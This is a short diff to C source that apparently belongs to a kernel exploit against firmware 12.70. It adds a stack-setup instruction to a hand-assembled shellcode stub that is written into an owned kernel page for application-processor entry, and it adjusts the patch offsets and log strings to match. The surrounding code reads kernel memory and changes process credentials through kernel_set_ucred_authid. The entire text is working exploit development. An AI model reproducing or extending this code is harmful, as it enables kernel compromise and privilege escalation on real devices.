@@ -14,8 +14,8 @@
 #include "carrier_1270.h"
 #include "util.h"
 
-#if !defined(AP_ENTRY_PREP_ONLY_1270) && !defined(AP_ENTRY_REENABLE_AFTER_KP_1270)
-#error "12.70 owned-carrier AP-entry probe KP'd on S3 resume; do not rebuild unchanged"
+#if !defined(AP_ENTRY_PREP_ONLY_1270) && !defined(AP_ENTRY_REENABLE_AFTER_TWO_KPS_1270)
+#error "12.70 owned-page AP entry KP'd with and without a stack; do not rebuild unchanged"
 #endif
 
 #define FW_1270             0x12700000U
@@ -29,7 +29,7 @@
 #define AP_MARKER           0x1270A9E17E5E0001ULL
 #define AP_CR3_PA           0x68000ULL
 #define AP_STUB_OFFSET      0x100ULL
-#define AP_STUB_BYTES       35U
+#define AP_STUB_BYTES       42U
 #define AP_PATCH_BYTES      64U
 #define FRAME_4K            0x000FFFFFFFFFF000ULL
 #define FRAME_2M            0x000FFFFFFFE00000ULL
@@ -82,6 +82,7 @@ static int stage_ap_stub(uint64_t carrier, uint64_t oracle, uint64_t vector)
 {
   uint64_t magic = AP_MARKER;
   static const uint8_t template[AP_STUB_BYTES] = {
+    0x48, 0x8d, 0x25, 0xf9, 0x0d, 0x00, 0x00, // lea rsp, [rip+0xdf9] -> page+0xf00
     0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, // movabs rax, marker address
     0x48, 0xba, 0, 0, 0, 0, 0, 0, 0, 0, // movabs rdx, marker value
     0x48, 0x89, 0x10,                   // mov [rax], rdx
@@ -89,9 +90,9 @@ static int stage_ap_stub(uint64_t carrier, uint64_t oracle, uint64_t vector)
     0xff, 0xe1                          // jmp rcx
   };
   memcpy(ap_stub, template, sizeof(ap_stub));
-  memcpy(ap_stub + 2, &oracle, 8);
-  memcpy(ap_stub + 12, &magic, 8);
-  memcpy(ap_stub + 25, &vector, 8);
+  memcpy(ap_stub + 9, &oracle, 8);
+  memcpy(ap_stub + 19, &magic, 8);
+  memcpy(ap_stub + 32, &vector, 8);
   if (kread(carrier, saved_carrier, sizeof(saved_carrier)) != 0)
     return -1;
   for (unsigned i = 0; i < sizeof(saved_carrier); ++i)
@@ -302,7 +303,7 @@ int main(void)
     kernel_set_ucred_authid(getpid(), authid);
     return 8;
   }
-  if (save_line("carrier,staged,bytes=35,original_zero=1\n", 0) != 0) {
+  if (save_line("carrier,staged,bytes=42,stack=page+0xf00,original_zero=1\n", 0) != 0) {
     int restored = restore_ap_stub(kdldmap(stub_va));
     klog("APE1270,1,stop,stage=save-carrier,restore=%d\n", restored);
     carrier1270_release(&owned_carrier);
